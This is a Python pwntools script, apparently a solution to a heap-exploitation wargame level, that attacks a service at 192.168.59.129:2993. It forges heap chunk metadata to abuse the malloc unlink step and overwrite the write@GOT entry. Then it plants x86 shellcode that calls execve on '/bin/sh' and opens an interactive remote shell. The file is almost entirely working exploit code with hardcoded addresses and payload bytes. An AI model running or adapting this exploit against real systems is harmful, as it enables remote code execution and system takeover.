

from pwn import *


# Word which is commonly seen in heap: 0x44525346 == "FSRD"
# macro get_max_fast() in malloc/malloc.c returns at least 64 Bytes

# context.log_level = logging.DEBUG
conn = remote("192.168.59.129", 2993)

chunk_sz = 128 + 8 # == 136 == 0x88

def assert_buf(buf):
    assert(len(buf) == chunk_sz - 8)
    assert(buf.startswith(b'FSRD'))


def generate_simple_buffer(content=b''):
    """
    Generates the first instance of buf that is to be sent to the target program
    It sets the ground for further buffers in order to be able to overwrite heap metadata
    """
    chunk_prefix = b'FSRD'
    chunk_suffix = b'/ROOT\x00'
    chunk = (
        chunk_prefix +
        content +
        b'A'*(chunk_sz - 8 - len(chunk_prefix) - len(content) - len(chunk_suffix)) +
        chunk_suffix
    )
    return chunk

def generate_buffer(prev_sz, sz, fd=b'FSRD', bk=b'AAAA'):
    """
    Generates an instance of buf variable that when sent to the target
    program, will allocate a heap chunk, which will have the metadata
    prev_sz (bytes)
    sz (bytes)
    fd (bytes)
    bk (bytes)

    Returns the generated buffer
    """
    chunk_prefix = b'FSRDDRSFROOT'
    chunk_suffix = b'/ROOT\x00'
    chunk_payload = (
        b'/' + 
        b'D'*(len(chunk_suffix) - 1)    + # -1 since we also copy the '/' character
        prev_sz + sz + fd + bk +
        b'\x00' # This byte will not be coppied over
    )
    chunk = (
        chunk_prefix +
        chunk_payload +
        b'A'*(chunk_sz - 8 - len(chunk_prefix) - len(chunk_payload) - len(chunk_suffix)) +
        chunk_suffix
    )
    assert_buf(chunk)
    return chunk

write__got_plt = 0x0804d41c
heap_base_addr = 0x0804e000
libc_base_addr = 0xb7e97000
libc_offset__bin_sh = 0x0011f3bf    # string "/bin/sh"
stub__execve = 0x08048f6c    # function stub execve@glibc
chunk2_addr = heap_base_addr + 2*0x88 # 0x0804e110
payload_offset = 0x20   # executable payload offset within a chunk

### buf which will setup chunk0 ###
buf = generate_simple_buffer(
    # padding so that the bellow fake chunk will be 8-Byte aligned.
    # Also we want the last bit set to 0, as the fake_chunk->nextsize->size points here. This is required in order to consolidate forward
    pack(0x41414140, 32, 'little', False) +
    (
        # Setup fake heap chunk
        pack(0xfffffff7, 32, 'little', False) + # prev_sz == -8. Unused, but we cannot have \x00 Bytes, since these terminate the string
        pack(0xfffffff7, 32, 'little', False) + # sz == -8. PREV_INUSE is set to True
        pack(write__got_plt - 12, 32, 'little', False) +        # fd
        pack(chunk2_addr + payload_offset, 32, 'little', False) # bk
    )
)
conn.send(buf)

### buf which will setup chunk1 ###
buf = generate_buffer(
    pack(0xffffffff - 8, 32, 'little', False), # prev_sz == -8. Will be overwritten by free(chunk0)
    pack(0xffffff89, 32, 'little', False) # sz == -(chunk_sz-0x10) with last bit set. Tha apokthsei epeita last bit == 0 (prev not in use) logo free(chunk0)
)
conn.send(buf)

### buf which will setup chunk2 ###
payload = (
    b'\xeb\x0a'         + # jmp $+12 (Relative jump to skip 12 Bytes from the start of this instruction)
    b'B'*10             + # This will not be executed due to the above jmp. A part of this sequence will be replaced by the unlink() macro
#    b'\xCC'             + # SIGTRAP, for debugging
    b'\x6a\x00'         +   # push 0x0 (arg2 - envp)
    b'\x6a\x00'         +   # push 0x0 (arg1 - argv)
    (   # mov eax, 0xb7fb63bf
        b'\xb8'         +
        pack(libc_base_addr + libc_offset__bin_sh, 32, 'little', False)
    )                   +
    b'\x50'             +   # push eax  (arg0 - filename)
    (   # mov eax, execve@glibc
        b'\xb8'         +
        pack(stub__execve, 32, 'little', False)
    )                   +
    b'\xff\xd0'             # call eax
)
buf = generate_simple_buffer(
    b'/ROOT\x00' +  # We write this part so that check_path() won't crash
    b'A'*(payload_offset - 8 - 4 - 6) + # -8 for metadata. -4 for "FSRD". -6 for "/ROOT\x00"
    payload
)
conn.send(buf)

### buf which will setup chunk3 ###
conn.send("FSRD Stop")
conn.interactive()
conn.close()
